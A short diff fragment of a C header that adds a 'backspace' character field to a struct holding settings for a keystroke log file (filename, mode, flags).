@@ -16,6 +16,7 @@ typedef struct {
 
     struct {
         char filename[KEY_LOG_LEN];
+        char backspace;
         mode_t mode;
         int flags;
     } keylog;
